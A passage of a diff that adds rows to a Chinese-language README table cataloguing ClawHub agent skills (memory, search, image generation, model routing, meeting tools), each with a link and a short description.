+<td>在开始任何工作之前必须使用此工具收集上下文。这是面向AI代理的知识管理。使用 brv 存储和检索项目模式，...</td>
+</tr>
+<tr>
+<td align="center">17</td>
+<td>深度研究</td>
+<td>Deep Research Pro</td>
+<td><a href="https://clawdhub.com/skills/deep-research-pro">ClawHub/deep-research-pro</a></td>
+<td>多源深度研究代理，搜索网页并综合发现，交付带引用的报告，无需 API 密钥。</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td>Tavily AI 搜索</td>
+<td>Tavily AI Search 🔑</td>
+<td><a href="https://clawdhub.com/skills/tavily">ClawHub/tavily</a></td>
+<td>使用Tavily Search API进行AI优化的网络搜索。适用于需要全面网络调研、查询时事、特定领域搜索或AI生成答案摘要的场景。Tavily针对LLM进行了优化，提供整洁的结构化结果、答案生成和原始内容提取功能，最适合研究任务、新闻查询、事实核查及收集权威来源。</td>
+</tr>
+<tr>
+<td align="center">19</td>
+<td>主动代理（轻量版）</td>
+<td>Proactive Agent Lite</td>
+<td><a href="https://clawdhub.com/skills/proactive-agent-lite">ClawHub/proactive-agent-lite</a></td>
+<td>利用记忆架构、反向提示和自愈模式，将AI代理从任务执行者转变为主动合作伙伴。轻量版...</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td>记忆管理器</td>
+<td>Memory Manager</td>
+<td><a href="https://clawdhub.com/skills/memory-manager">ClawHub/memory-manager</a></td>
+<td>Agent本地记忆管理。支持压缩检测、自动快照与语义搜索。适用于在记忆丢失前检测压缩风险、保存上下文快照、搜索历史记忆或追踪使用模式，彻底告别上下文丢失。</td>
+</tr>
+<tr>
+<td align="center">21</td>
+<td>腾讯会议</td>
+<td>腾讯会议 🔑</td>
+<td><a href="https://clawdhub.com/skills/tencent-meeting-skill">ClawHub/tencent-meeting-skill</a></td>
+<td>腾讯会议：会议管理及音视频协作助手。提供预约/创建/修改/取消会议、查询会议详情与会议号转换、查看参会/受邀/等候室成员、查询用户会议列表（即将开始/进行中/已结束）、查询录制列表及下载地址、获取转写全文/段落/搜索、获取AI智能纪要（支持多语言翻译）、时间转换与版本检查。</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td>PDF 文本提取</td>
+<td>Pdf Extract</td>
+<td><a href="https://clawdhub.com/skills/pdf-extract">ClawHub/pdf-extract</a></td>
+<td>从PDF文件中提取文本供大模型处理</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td>超能力技能指南</td>
+<td>Using Superpowers</td>
+<td><a href="https://clawdhub.com/skills/using-superpowers">ClawHub/using-superpowers</a></td>
+<td>在任何对话开始时使用——确立如何查找及使用技能，要求在做出任何回应（包括澄清性问题）之前调用技能工具。</td>
+</tr>
+<tr>
+<td align="center">24</td>
+<td>自我改进代理（中文版）</td>
+<td>Self Improving Agent CN</td>
+<td><a href="https://clawdhub.com/skills/self-improving-agent-cn">ClawHub/self-improving-agent-cn</a></td>
+<td>AI自我改进与记忆系统 - 解决'同类错误反复犯、用户纠正不长记性'的痛点。自动捕获错误、用户纠正、最佳实践，并转化为长期记忆。</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td>自我反思</td>
+<td>Self Reflection</td>
+<td><a href="https://clawdhub.com/skills/self-reflection">ClawHub/self-reflection</a></td>
+<td>结构化反思与记忆驱动的持续自我提升</td>
+</tr>
+<tr>
+<td align="center">26</td>
+<td>Markdown 网页转换</td>
+<td>Markdown.new Skill</td>
+<td><a href="https://clawdhub.com/skills/markdown-convert">ClawHub/markdown-convert</a></td>
+<td>利用 markdown.new 将公开网页转换为简洁的 Markdown 格式，适用于 AI 工作流。当任务需要将 URL 转换为 Markdown 以进行摘要或 RAG 索引时使用。</td>
+</tr>
+<tr>
+<td align="center">27</td>
+<td>OpenAI 图像生成</td>
+<td>Openai Image Gen 🔑</td>
+<td><a href="https://clawdhub.com/skills/openai-image-gen">ClawHub/openai-image-gen</a></td>
+<td>通过 OpenAI Images API 批量生成图像。支持随机提示词采样，并提供 index.html 图库展示。</td>
+</tr>
+<tr>
+<td align="center">28</td>
+<td>提示词工程专家</td>
+<td>Prompt Engineering Expert</td>
+<td><a href="https://clawdhub.com/skills/prompt-engineering-expert">ClawHub/prompt-engineering-expert</a></td>
+<td>提示词工程、自定义指令设计及AI智能体提示词优化领域的资深专家。</td>
+</tr>
+<tr>
+<td align="center">29</td>
+<td>ElevenLabs 语音合成</td>
+<td>Sag 🔑</td>
+<td><a href="https://clawdhub.com/skills/sag">ClawHub/sag</a></td>
+<td>具有 Mac 风格 say 交互的 ElevenLabs 语音合成。</td>
+</tr>
+<tr>
+<td align="center">30</td>
+<td>代理自主套件</td>
+<td>Agent Autonomy Kit</td>
+<td><a href="https://clawdhub.com/skills/agent-autonomy-kit">ClawHub/agent-autonomy-kit</a></td>
+<td>停止等待提示，继续工作。</td>
+</tr>
+<tr>
+<td align="center">31</td>
+<td>Whisper API 转写</td>
+<td>Openai Whisper Api 🔑</td>
+<td><a href="https://clawdhub.com/skills/openai-whisper-api">ClawHub/openai-whisper-api</a></td>
+<td>使用 OpenAI 音频转录 API（Whisper）进行音频转录。</td>
+</tr>
+<tr>
+<td align="center">32</td>
+<td>代理团队编排</td>
+<td>Agent Team Orchestration</td>
+<td><a href="https://clawdhub.com/skills/agent-team-orchestration">ClawHub/agent-team-orchestration</a></td>
+<td>编排具有明确角色、任务生命周期、交接协议和审查工作流的多智能体团队。适用场景：(1) 组建2个以上不同专长的智能体团队；(2) 定义任务路由与生命周期（收件箱→规格→构建→审查→完成）；(3) 创建智能体间的交接协议；(4) 建立审查与质量关卡；(5) 管理智能体间的异步通信与工件共享。</td>
+</tr>
+<tr>
+<td align="center">33</td>
+<td>记忆清理</td>
+<td>Memory Hygiene</td>
+<td><a href="https://clawdhub.com/skills/memory-hygiene">ClawHub/memory-hygiene</a></td>
+<td>审核、清理并优化 Clawdbot 的向量记忆（LanceDB）。适用于记忆充斥冗余数据、无关自动召回导致 Token 消耗过高，或配置记忆维护自动化时。</td>
+</tr>
+<tr>
+<td align="center">34</td>
+<td>面试模拟器</td>
+<td>Interview Simulator</td>
+<td><a href="https://clawdhub.com/skills/interview-simulator">ClawHub/interview-simulator</a></td>
+<td>模拟各类职位和经验水平的面试，提供定制化的技术、行为及案例问题，并给予详细反馈与评分。</td>
+</tr>
+<tr>
+<td align="center">35</td>
+<td>简历助手</td>
+<td>Resume Assistant</td>
+<td><a href="https://clawdhub.com/skills/resume-assistant">ClawHub/resume-assistant</a></td>
+<td>帮助求职者润色、定制、评分并导出简历，提供详细的检查清单审查和多格式支持。</td>
+</tr>
+<tr>
+<td align="center">36</td>
+<td>记忆</td>
+<td>Memory</td>
+<td><a href="https://clawdhub.com/skills/memory">ClawHub/memory</a></td>
+<td>无限有序记忆，补充代理内置记忆，提供无限分类存储</td>
+</tr>
+<tr>
+<td align="center">37</td>
+<td>本地Whisper</td>
+<td>Local Whisper</td>
+<td><a href="https://clawdhub.com/skills/local-whisper">ClawHub/local-whisper</a></td>
+<td>使用 OpenAI Whisper 的本地语音转文字，模型下载后完全离线运行，提供多种模型尺寸的高质量转录。</td>
+</tr>
+<tr>
+<td align="center">38</td>
+<td>技能发现</td>
+<td>Find Skill</td>
+<td><a href="https://clawdhub.com/skills/find-skill">ClawHub/find-skill</a></td>
+<td>帮助用户在提问如「如何做X」、「找X的技能」、「有能...的技能吗」或表达其他需求时发现并安装智能体技能。</td>
+</tr>
+<tr>
+<td align="center">39</td>
+<td>图像OCR</td>
+<td>Image Ocr</td>
+<td><a href="https://clawdhub.com/skills/image-ocr">ClawHub/image-ocr</a></td>
+<td>使用 Tesseract OCR 从图像中提取文本。</td>
+</tr>
+<tr>
+<td align="center">40</td>
+<td>Perplexity</td>
+<td>Perplexity 🔑</td>
+<td><a href="https://clawdhub.com/skills/perplexity">ClawHub/perplexity</a></td>
+<td>通过Perplexity API进行AI驱动的网络搜索，返回带引用的可靠响应，支持批量查询。</td>
+</tr>
+<tr>
+<td align="center">41</td>
+<td>认知记忆</td>
+<td>Cognitive Memory</td>
+<td><a href="https://clawdhub.com/skills/cognitive-memory">ClawHub/cognitive-memory</a></td>
+<td>智能多存储记忆系统，模拟人脑的编码、整合、衰减和检索机制。用于设置智能体记忆、配置记忆/遗忘触发器、启用休眠反思、构建知识图谱或添加审计追踪。采用情景、语义、程序和核心记忆存储的认知架构，替代简单平面文件记忆。支持多智能体系统的共享读访问和门控写访问模型。包含随时间深化理解的哲学元反思功能。涵盖MEMORY.md、事件日志、实体图谱、衰减评分、反思周期、演进追踪和系统级审计。</td>
+</tr>
+<tr>
+<td align="center">42</td>
+<td>AI人格os</td>
+<td>AI Persona OS</td>
+<td><a href="https://clawdhub.com/skills/ai-persona-os">ClawHub/ai-persona-os</a></td>
+<td>适用于 OpenClaw 5.x 代理的完整操作系统，内置记忆工具集成（memory_search、memory_get、DREAMS.md），Discord 频道路由修复……</td>
+</tr>
+<tr>
+<td align="center">43</td>
+<td>Tavily 搜索 Pro</td>
+<td>Tavily Search Pro 🔑</td>
+<td><a href="https://clawdhub.com/skills/tavily-search-pro">ClawHub/tavily-search-pro</a></td>
+<td>Tavily AI 搜索平台，提供 5 种模式：搜索（网页/新闻/金融）、提取（URL 内容）、爬取（网站爬取）、映射（站点地图发现）和研究（深度研究，含引用）。用途：LLM 回答的网页搜索、内容提取、网站爬取、深度研究。</td>
+</tr>
+<tr>
+<td align="center">44</td>
+<td>主动代理</td>
+<td>Proactive Agent Skill</td>
+<td><a href="https://clawdhub.com/skills/proactive-agent-skill">ClawHub/proactive-agent-skill</a></td>
+<td>将AI代理从单纯的执行者转变为能够预判需求并持续改进的主动合作伙伴。包含WAL协议、工作缓冲、Autono...</td>
+</tr>
+<tr>
+<td align="center">45</td>
+<td>xAI / Grok</td>
+<td>xAI / Grok 🔑</td>
+<td><a href="https://clawdhub.com/skills/x-ai">ClawHub/x-ai</a></td>
+<td>通过 xAI API 与 Grok 模型对话。支持 Grok-3、Grok-3-mini、视觉等功能。</td>
+</tr>
+<tr>
+<td align="center">46</td>
+<td>图像generation</td>
+<td>AI Image Generation 🔑</td>
+<td><a href="https://clawdhub.com/skills/image-generation">ClawHub/image-generation</a></td>
+<td>利用提示工程、风格控制和智能编辑，借助GPT Image、Gemini Nano Banana、FLUX、Imagen等顶级服务商创作AI图像。</td>
+</tr>
+<tr>
+<td align="center">47</td>
+<td>AI新闻采集器</td>
+<td>ai-news-collectors</td>
+<td><a href="https://clawdhub.com/skills/ai-news-collectors">ClawHub/ai-news-collectors</a></td>
+<td>AI 新闻聚合与热度排序工具。当用户询问 AI 领域最新动态时触发，如：&quot;今天有什么 AI 新闻？&quot;&quot;总结一下这周的 AI 动态&quot;&quot;最近有什么火的 AI 产品？&quot;&quot;AI 圈最近在讨论什么？&quot;。覆盖：新产品发布、研究论文、行业动态、融资新闻、开源项目更新、社区病毒传播现象、AI 工具/Agent 热门项目。输出中文摘要列表，按热度排序，附带原文链接。</td>
+</tr>
+<tr>
+<td align="center">48</td>
+<td>自我改进</td>
+<td>Self Improving Agent</td>
+<td><a href="https://clawdhub.com/skills/self-improvement">ClawHub/self-improvement</a></td>
+<td>记录经验教训、错误及修正以实现持续改进。适用场景：（1）命令或操作意外失败，（2）用户纠正Claude...</td>
+</tr>
+<tr>
+<td align="center">49</td>
+<td>文件管理器</td>
+<td>File Manager</td>
+<td><a href="https://clawdhub.com/skills/file-manager">ClawHub/file-manager</a></td>
+<td>OpenClaw自动化文件管理助手，用于批量文件操作、智能分类、重复文件清理、文件重命名、目录同步等任务。当用户需要整理文件、批量重命名、清理重复文件、同步目录或自动化文件工作流时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">50</td>
+<td>记忆分层</td>
+<td>Memory Tiering</td>
+<td><a href="https://clawdhub.com/skills/memory-tiering">ClawHub/memory-tiering</a></td>
+<td>自动化的分层内存管理（热、温、冷）。使用此技能在内存操作或压缩期间组织、修剪和归档上下文。</td>
+</tr>
+<tr>
+<td align="center">51</td>
+<td>gemini深度研究</td>
+<td>Gemini Deep Research 🔑</td>
+<td><a href="https://clawdhub.com/skills/gemini-deep-research">ClawHub/gemini-deep-research</a></td>
+<td>使用Gemini深度研究代理执行复杂长期研究任务。适用于需要多源综合、竞争分析、市场研究或系统性网络搜索分析的综合技术调研。</td>
+</tr>
+<tr>
+<td align="center">52</td>
+<td>Cellcog</td>
+<td>Cellcog 🔑</td>
+<td><a href="https://clawdhub.com/skills/cellcog">ClawHub/cellcog</a></td>
+<td>全能AI子代理——支持研究、图片、视频、音频、音乐、播客、虚拟形象、声音克隆、文档、电子表格、数据看板、3D模型、图表等任务处理。</td>
+</tr>
+<tr>
+<td align="center">53</td>
+<td>命令中心</td>
+<td>Openclaw Command Center</td>
+<td><a href="https://clawdhub.com/skills/command-center">ClawHub/command-center</a></td>
+<td>OpenClaw任务控制面板 - 实时会话监控、LLM使用追踪、成本分析及系统状态查看</td>
+</tr>
+<tr>
+<td align="center">54</td>
+<td>UI审计</td>
+<td>UI Audit</td>
+<td><a href="https://clawdhub.com/skills/ui-audit">ClawHub/ui-audit</a></td>
+<td>自动化UI审计AI技能。基于Tommy Geoco的《Making UX Decisions》，根据成熟的UX原则评估界面的视觉层级、无障碍性、认知负荷和导航等方面。</td>
+</tr>
+<tr>
+<td align="center">55</td>
+<td>自我改进主动代理</td>
+<td>Self-Improving Proactive Agent</td>
+<td><a href="https://clawdhub.com/skills/self-improving-proactive-agent">ClawHub/self-improving-proactive-agent</a></td>
+<td>一项融合自我改进与主动性的统一OpenClaw技能：从纠错中学习、保持活跃状态、快速恢复上下文并推动工作进展。</td>
+</tr>
+<tr>
+<td align="center">56</td>
+<td>文档专业版</td>
+<td>Document Pro</td>
+<td><a href="https://clawdhub.com/skills/document-pro">ClawHub/document-pro</a></td>
+<td>文档处理技能 - 让 AI 能够读取、解析、提取 PDF、DOCX、PPT 等文档的关键信息。当用户要求分析文档、提取内容、总结报告时触发此技能。</td>
+</tr>
+<tr>
+<td align="center">57</td>
+<td>OpenClaw代理优化</td>
+<td>Openclaw Agent Optimize</td>
+<td><a href="https://clawdhub.com/skills/openclaw-agent-optimize">ClawHub/openclaw-agent-optimize</a></td>
+<td>使用场景：想对 OpenClaw 工作区进行结构化审计，生成选项并推荐改进方案（成本、模型路由、上下文规范、委托等）</td>
+</tr>
+<tr>
+<td align="center">58</td>
+<td>reflect学习</td>
+<td>Reflect</td>
+<td><a href="https://clawdhub.com/skills/reflect-learn">ClawHub/reflect-learn</a></td>
+<td>通过对话分析进行自我改进。从纠正和成功模式中提取经验，提议更新智能体文件或创建新技能。</td>
+</tr>
+<tr>
+<td align="center">59</td>
+<td>代理编排器</td>
+<td>Agent Orchestrator</td>
+<td><a href="https://clawdhub.com/skills/agent-orchestrator">ClawHub/agent-orchestrator</a></td>
+<td>通过自主子智能体编排复杂任务的元智能体技能。将宏任务分解为子任务，生成具备动态SKILL.md文件的专用子智能体，协调基于文件的通信，汇总结果并在完成后解散智能体。</td>
+</tr>
+<tr>
+<td align="center">60</td>
+<td>antigravity图像生成</td>
+<td>Antigravity Image Generator 🔑</td>
+<td><a href="https://clawdhub.com/skills/antigravity-image-gen">ClawHub/antigravity-image-gen</a></td>
+<td>使用内部 Google Antigravity API（Gemini 3 Pro Image）生成图像，高质量、原生生成，无需浏览器自动化。</td>
+</tr>
+<tr>
+<td align="center">61</td>
+<td>自我evolving技能</td>
+<td>Self Evolving Skill</td>
+<td><a href="https://clawdhub.com/skills/self-evolving-skill">ClawHub/self-evolving-skill</a></td>
+<td>{&quot;answer&quot;:&quot;元认知自主学习系统——基于预测编码与价值驱动机制的技能自动演化。&quot;}</td>
+</tr>
+<tr>
+<td align="center">62</td>
+<td>token优化器</td>
+<td>Tokenoptimizer</td>
+<td><a href="https://clawdhub.com/skills/token-optimizer">ClawHub/token-optimizer</a></td>
+<td>降低97% OpenClaw AI成本。含Haiku模型路由、免费Ollama心跳、提示词缓存及预算控制。5分钟内将月费从1500美元降至50美元。</td>
+</tr>
+<tr>
+<td align="center">63</td>
+<td>OpenClawtoken优化器</td>
+<td>OpenClaw Token Optimizer</td>
+<td><a href="https://clawdhub.com/skills/openclaw-token-optimizer">ClawHub/openclaw-token-optimizer</a></td>
+<td>通过智能模型路由、心跳优化、预算追踪及原生2026.2.15功能，降低OpenClaw令牌用量与API成本。</td>
+</tr>
+<tr>
+<td align="center">64</td>
+<td>neural记忆</td>
+<td>Neural Memory</td>
+<td><a href="https://clawdhub.com/skills/neural-memory">ClawHub/neural-memory</a></td>
+<td>关联记忆与扩散激活，提供持久、智能的回忆。主动使用时机：(1) 需要记忆事实、决定、错误或...</td>
+</tr>
+<tr>
+<td align="center">65</td>
+<td>主动solvr</td>
+<td>Proactive Solvr 🔑</td>
+<td><a href="https://clawdhub.com/skills/proactive-solvr">ClawHub/proactive-solvr</a></td>
+<td>利用灵魂持久化、Solvr 集体知识、自愈心跳及配置执行脚本，将 AI Agent 转变为主动合作伙伴。</td>
+</tr>
+<tr>
+<td align="center">66</td>
+<td>qianfan-deepresearch</td>
+<td>qianfan-deepresearch 🔑</td>
+<td><a href="https://clawdhub.com/skills/deepresearch-conversation">ClawHub/deepresearch-conversation</a></td>
+<td>调用百度千帆 DeepResearch Agent API 自动生成深度研究报告（输出 Markdown 与 HTML 两种格式），一键完成「创建会话 → 发起研究 → 自动跳过澄清 → 自动确认大纲 → 获取报告下载链接」完整流程。支持三种深度模式：lite（轻量版，速度快，默认）/ standard（标准…）</td>
+</tr>
+<tr>
+<td align="center">67</td>
+<td>Personas</td>
+<td>Personas</td>
+<td><a href="https://clawdhub.com/skills/personas">ClawHub/personas</a></td>
+<td>可按需转换为20种专业AI人格，支持对话中切换，仅加载当前人格。</td>
+</tr>
+<tr>
+<td align="center">68</td>
+<td>Adaptive Reasoning</td>
+<td>Adaptive Reasoning</td>
+<td><a href="https://clawdhub.com/skills/adaptive-reasoning">ClawHub/adaptive-reasoning</a></td>
+<td>自动评估任务复杂度并调整推理等级。在每条用户消息中触发，判断启用扩展思考（推理模式）能否提升回答质量，作为回答复杂问题前的预处理步骤。</td>
+</tr>
+<tr>
+<td align="center">69</td>
+<td>ws代理浏览器</td>
+<td>Agent Browser</td>
+<td><a href="https://clawdhub.com/skills/ws-agent-browser">ClawHub/ws-agent-browser</a></td>
+<td>浏览器智能控制。自动化操作、截图、填表、数据抓取。</td>
+</tr>
+<tr>
+<td align="center">70</td>
+<td>代理council</td>
+<td>Agent Council 🔑</td>
+<td><a href="https://clawdhub.com/skills/agent-council">ClawHub/agent-council</a></td>
+<td>用于创建自主AI智能体及管理OpenClaw Discord频道的完整工具包。适用于搭建多智能体系统、创建新智能体或管理Discord频道组织。</td>
+</tr>
+<tr>
+<td align="center">71</td>
+<td>MCP技能</td>
+<td>Mcp Skill</td>
+<td><a href="https://clawdhub.com/skills/mcp-skill">ClawHub/mcp-skill</a></td>
+<td>提供MCP工具访问，包括网络搜索、高级搜索、代码上下文、深度研究、网页爬取、公司调研及LinkedIn搜索。</td>
+</tr>
+<tr>
+<td align="center">72</td>
+<td>hippocampus记忆</td>
+<td>Hippocampus</td>
+<td><a href="https://clawdhub.com/skills/hippocampus-memory">ClawHub/hippocampus-memory</a></td>
+<td>为AI智能体提供的持久记忆系统，自动进行编码、衰减和语义强化，类似于大脑的海马体。基于斯坦福生成式智能体（Park等，2023）。</td>
+</tr>
+<tr>
+<td align="center">73</td>
+<td>AI代理助手</td>
+<td>AI Agent Helper</td>
+<td><a href="https://clawdhub.com/skills/ai-agent-helper">ClawHub/ai-agent-helper</a></td>
+<td>AI Agent 設定同優化助手 - Prompt Engineering、Task Decomposition、Agent Loop設計</td>
+</tr>
+<tr>
+<td align="center">74</td>
+<td>OpenClaw记忆</td>
+<td>OpenClaw Memory 🔑</td>
+<td><a href="https://clawdhub.com/skills/openclaw-mem">ClawHub/openclaw-mem</a></td>
+<td>Manage, optimize, and troubleshoot the OpenClaw memory system — MEMORY.md curation, daily logs (memory/YYYY-MM-DD.md), memory_search tuning, compaction survi...</td>
+</tr>
+<tr>
+<td align="center">75</td>
+<td>gemini图像simple</td>
+<td>Gemini Image Simple 🔑</td>
+<td><a href="https://clawdhub.com/skills/gemini-image-simple">ClawHub/gemini-image-simple</a></td>
+<td>使用纯 Python 标准库通过 Gemini API 生成和编辑图像。零依赖——适用于 pip/uv 不可用的受限环境。</td>
+</tr>
+<tr>
+<td align="center">76</td>
+<td>context优化器</td>
+<td>Context Optimizer</td>
+<td><a href="https://clawdhub.com/skills/context-optimizer">ClawHub/context-optimizer</a></td>
+<td>**支持DeepSeek 64K上下文窗口的高级上下文管理，具备自动压缩与动态优化功能。智能压缩（合并、摘要、提取）、查询感知相关性评分、分层记忆系统与上下文存档，并向聊天记录优化事件日志。**</td>
+</tr>
+<tr>
+<td align="center">77</td>
+<td>OpenClawMCP插件</td>
+<td>Mcp Integration</td>
+<td><a href="https://clawdhub.com/skills/openclaw-mcp-plugin">ClawHub/openclaw-mcp-plugin</a></td>
+<td>通过模型上下文协议服务器访问外部工具和数据源，使AI代理能够发现并执行配置的MCP服务器（如法律数据库、API、数据库连接器、天气服务等）中的工具。</td>
+</tr>
+<tr>
+<td align="center">78</td>
+<td>自我改进代理102</td>
+<td>Self Improving Agent 1.0.2</td>
+<td><a href="https://clawdhub.com/skills/self-improving-agent-1-0-2">ClawHub/self-improving-agent-1-0-2</a></td>
+<td>捕获学习内容、错误和纠正措施以实现持续改进。适用场景：(1)命令或操作意外失败；(2)用户纠正Claude（'不对，那错了'、'实际上'）；(3)用户请求不存在的功能；(4)外部API或工具失败；(5)Claude意识到知识过时或不正确；(6)发现更好的重复任务处理方法。重大任务前也需回顾学习内容。</td>
+</tr>
+<tr>
+<td align="center">79</td>
+<td>代理builder</td>
+<td>Agent Builder</td>
+<td><a href="https://clawdhub.com/skills/agent-builder">ClawHub/agent-builder</a></td>
+<td>端到端构建高性能 OpenClaw 智能体。用于设计新智能体（包含人设与运行规则）并生成所需工作区文件，或迭代现有智能体的行为、护栏、自主模型、心跳计划及技能列表。</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td>代理directory</td>
+<td>Agent Directory</td>
+<td><a href="https://clawdhub.com/skills/agent-directory">ClawHub/agent-directory</a></td>
+<td>AI智能体服务目录。探索专为智能体构建的工具、平台和基础设施。</td>
+</tr>
+<tr>
+<td align="center">81</td>
+<td>ClawVault</td>
+<td>ClawVault</td>
+<td><a href="https://clawdhub.com/skills/clawvault">ClawHub/clawvault</a></td>
+<td>具备记忆图谱、上下文配置、检查点/恢复、结构化存储、语义搜索、观察记忆、任务追踪、画布等功能的代理记忆系统。</td>
+</tr>
+<tr>
+<td align="center">82</td>
+<td>agentic工作流自动化</td>
+<td>Agentic Workflow Automation</td>
+<td><a href="https://clawdhub.com/skills/agentic-workflow-automation">ClawHub/agentic-workflow-automation</a></td>
+<td>生成可重用的多步智能体工作流蓝图。用于触发/动作编排、确定性工作流定义及自动化交接。</td>
+</tr>
+<tr>
+<td align="center">83</td>
+<td>beautygenerationAPI</td>
+<td>beauty-generation-api 🔑</td>
+<td><a href="https://clawdhub.com/skills/beauty-generation-api">ClawHub/beauty-generation-api</a></td>
+<td>AI人像图像生成，支持140+国家地区，多种风格，涵盖专业头像、角色设计与时尚可视化。快速生成（3...）</td>
+</tr>
+<tr>
+<td align="center">84</td>
+<td>Exa</td>
+<td>Exa 🔑</td>
+<td><a href="https://clawdhub.com/skills/exa">ClawHub/exa</a></td>
+<td>利用 Exa AI API 实现神经网页搜索与代码上下文检索，需要 EXA_API_KEY，用于查找文档、代码示例、研究论文或公司信息。</td>
+</tr>
+<tr>
+<td align="center">85</td>
+<td>拼多多比价技能</td>
+<td>🛍️ 淘宝/京东/拼多多比价技能</td>
+<td><a href="https://clawdhub.com/skills/taobao">ClawHub/taobao</a></td>
+<td>商品价格全网对比技能，获取淘宝、天猫、京东、拼多多、抖音、快手等平台的最优价格和优惠券信息，适用于用户购物或查找优惠的场景。</td>
+</tr>
+<tr>
+<td align="center">86</td>
+<td>中文去AI味</td>
+<td>中文去AI味</td>
+<td><a href="https://clawdhub.com/skills/humanize-zh">ClawHub/humanize-zh</a></td>
+<td>将AI生成的机械化文本转换为自然、有人情味的人类写作风格</td>
+</tr>
+<tr>
+<td align="center">87</td>
+<td>qwen图像</td>
+<td>Qwen Image 🔑</td>
+<td><a href="https://clawdhub.com/skills/qwen-image">ClawHub/qwen-image</a></td>
+<td>使用 Qwen Image API（阿里云 DashScope）根据文本描述生成高质量 AI 图像。当用户使用中文提示词请求图像生成时使用。</td>
+</tr>
+<tr>
+<td align="center">88</td>
+<td>Save Money</td>
+<td>Save Money</td>
+<td><a href="https://clawdhub.com/skills/save-money">ClawHub/save-money</a></td>
+<td>Auto-detect task complexity for Claude models (Haiku + Sonnet). Route simple tasks to Haiku, escalate complex ones to Sonnet. Save 50%+ on API costs. | 適用 Claude 模型（Haiku + Sonnet），自動偵測任務難度，簡單用 Hai...</td>
+</tr>
+<tr>
+<td align="center">89</td>
+<td>arXiv研究助手</td>
+<td>arXiv Research Assistant</td>
+<td><a href="https://clawdhub.com/skills/arxiv">ClawHub/arxiv</a></td>
+<td>{&quot;answer&quot;:&quot;搜索、下载并总结arXiv论文，专为AI/ML研究者打造。&quot;}</td>
+</tr>
+<tr>
+<td align="center">90</td>
+<td>智能模型switching</td>
+<td>Smart Model Switching</td>
+<td><a href="https://clawdhub.com/skills/smart-model-switching">ClawHub/smart-model-switching</a></td>
+<td>自动将任务路由至能胜任的最低成本Claude模型，采用三级递进：Haiku → Sonnet → Opus。响应前先分类。HAIKU（默认）：事实问答、问候、提醒、状态查询、简单文件操作、心跳、闲聊、1-2句任务。升配至SONNET：&gt;10行代码、分析对比、规划报告、多步推理、表格、&gt;3段长文、摘要、研究综合及多数对话。升配至OPUS：架构决策、复杂调试、多文件重构、战略规划、深度研判、深度...</td>
+</tr>
+<tr>
+<td align="center">91</td>
+<td>hermes代理</td>
+<td>Hermes Agent</td>
+<td><a href="https://clawdhub.com/skills/hermes-agent">ClawHub/hermes-agent</a></td>
+<td>将OpenClaw打造为具备种子工作空间规则、技能提升、反思记忆和主动维护的学习循环智能体。</td>
+</tr>
+<tr>
+<td align="center">92</td>
+<td>NotebookLMCLI</td>
+<td>NotebookLM CLI</td>
+<td><a href="https://clawdhub.com/skills/tiangong-notebooklm-cli">ClawHub/tiangong-notebooklm-cli</a></td>
+<td>NotebookLM CLI 封装，通过 `node {baseDir}/scripts/notebooklm.mjs` 调用。用于认证、笔记本、聊天、来源、笔记、分享、研究以及生成/下载工件。</td>
+</tr>
+<tr>
+<td align="center">93</td>
+<td>n8n监控</td>
+<td>N8n Monitor</td>
+<td><a href="https://clawdhub.com/skills/n8n-monitor">ClawHub/n8n-monitor</a></td>
+<td>通过Docker命令监控N8N容器状态、健康状况、日志及CPU/内存使用情况。</td>
+</tr>
+<tr>
+<td align="center">94</td>
+<td>tavily工具</td>
+<td>Tavily 🔑</td>
+<td><a href="https://clawdhub.com/skills/tavily-tool">ClawHub/tavily-tool</a></td>
+<td>使用 Tavily 网络搜索/发现查找 URL/来源，进行前期研究，收集最新链接，或生成带引用的网络摘要。</td>
+</tr>
+<tr>
+<td align="center">95</td>
+<td>搜索withtavily</td>
+<td>tavily-search 🔑</td>
+<td><a href="https://clawdhub.com/skills/search-with-tavily">ClawHub/search-with-tavily</a></td>
+<td>使用 Tavily API 进行网页搜索，提供强大的 AI 代理搜索功能，适用于获取当前信息、新闻、研究或热门内容等需求。</td>
+</tr>
+<tr>
+<td align="center">96</td>
+<td>加密自我学习</td>
+<td>Crypto Self-Learning</td>
+<td><a href="https://clawdhub.com/skills/crypto-self-learning">ClawHub/crypto-self-learning</a></td>
+<td>自学习加密交易系统。记录完整上下文的交易（指标、市场行情），分析盈亏模式，自动更新交易规则。用于记录交易、分析表现、找出有效/失效因素，持续提升交易准确率。</td>
+</tr>
+<tr>
+<td align="center">97</td>
+<td>jarvis语音</td>
+<td>Jarvis Voice</td>
+<td><a href="https://clawdhub.com/skills/jarvis-voice">ClawHub/jarvis-voice</a></td>
+<td>把你的AI变成JARVIS。集声音、智慧、个性于一体，幽默拉满。</td>
+</tr>
+<tr>
+<td align="center">98</td>
+<td>AI笔记of视频</td>
+<td>AI Notes of Video 🔑</td>
+<td><a href="https://clawdhub.com/skills/ai-notes-of-video">ClawHub/ai-notes-of-video</a></td>
+<td>通过提供视频URL，使用百度的视频分析和笔记提取API，生成文档、大纲和图文AI笔记。</td>
+</tr>
+<tr>
+<td align="center">99</td>
+<td>ollama本地</td>
+<td>Ollama Local</td>
+<td><a href="https://clawdhub.com/skills/ollama-local">ClawHub/ollama-local</a></td>
+<td>管理和使用本地 Ollama 模型。用于模型管理（列出/拉取/删除）、聊天/补全、嵌入以及本地 LLMs 的工具使用。涵盖 OpenClaw 子代理集成和模型选择指导。</td>
+</tr>
+<tr>
+<td align="center">100</td>
+<td>TuriX Computer Use</td>
+<td>TuriX Computer Use</td>
+<td><a href="https://clawdhub.com/skills/turix-cua">ClawHub/turix-cua</a></td>
+<td>基于 TuriX 的 macOS 自动化计算机使用代理 (CUA)。适用于需要在桌面上执行可视化任务，如打开应用、点击按钮，或操作无 CLI/API 的界面。</td>
+</tr>
+<tr>
+<td align="center">101</td>
+<td>fluid记忆</td>
+<td>Fluid Memory</td>
+<td><a href="https://clawdhub.com/skills/fluid-memory">ClawHub/fluid-memory</a></td>
+<td>基于艾宾浩斯遗忘曲线和访问频率的衰减模型设计的遗忘和归档机制，完全依赖openclaw原生记忆系统的拟人化流体记忆系统</td>
+</tr>
+<tr>
+<td align="center">102</td>
+<td>Vision Sandbox</td>
+<td>Vision Sandbox 🔑</td>
